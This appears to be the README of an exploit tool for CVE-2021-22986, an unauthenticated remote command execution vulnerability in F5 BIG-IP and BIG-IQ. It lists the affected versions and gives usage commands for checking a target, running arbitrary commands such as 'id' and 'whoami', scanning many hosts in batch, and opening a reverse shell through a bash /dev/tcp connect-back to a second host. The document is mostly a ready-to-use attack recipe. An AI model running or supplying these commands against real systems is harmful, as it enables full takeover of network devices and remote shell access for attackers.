## Vul Info

This Vulnerability allows for unauthenticated attackers with network access to the iControl REST interface, through the BIG-IP management interface and self IP addresses, to execute arbitrary system commands, create or delete files, and disable services. This VUlerability can only be exploited through the control plane and cannot be exploited through the data plane. Exploitation can lead to complete system compromise. The BIG-IP system in Appliance mode is also VUlerable.

## VUl Product

- F5 BIG-IQ 6.0.0-6.1.0
- F5 BIG-IQ 7.0.0-7.0.0.1
- F5 BIG-IQ 7.1.0-7.1.0.2
- F5 BIG-IP 12.1.0-12.1.5.2
- F5 BIG-IP 13.1.0-13.1.3.5
- F5 BIG-IP 14.1.0-14.1.3.1
- F5 BIG-IP 15.1.0-15.1.2
- F5 BIG-IP 16.0.0-16.0.1

## Vunl Check

**Basic usage**

```
python3 CVE_2021_22986.py
```
![](images/use.png)

**VUl check**

```
python3 CVE_2021_22986.py -v true -u https://192.168.174.164
```

**command execute:**

```
python3 CVE_2021_22986.py -a true -u https://192.168.174.164 -c id
```

```
python3 CVE_2021_22986.py -a true -u https://192.168.174.164 -c whoami
```

**batch scan**

```
python3 CVE_2021_22986.py -s true -f check.txt
```

**Reserve Shell**

```
python3 CVE_2021_22986.py -r true -u https://192.168.174.164 -c "bash -i >&/dev/tcp/192.168.174.129/8888 0>&1"
```
![](images/reverse.png)
![](images/reverse_ok.png)


## New POC
```
python3 newpoc.py https://192.168.174.164
```
![](images/newpoc.png)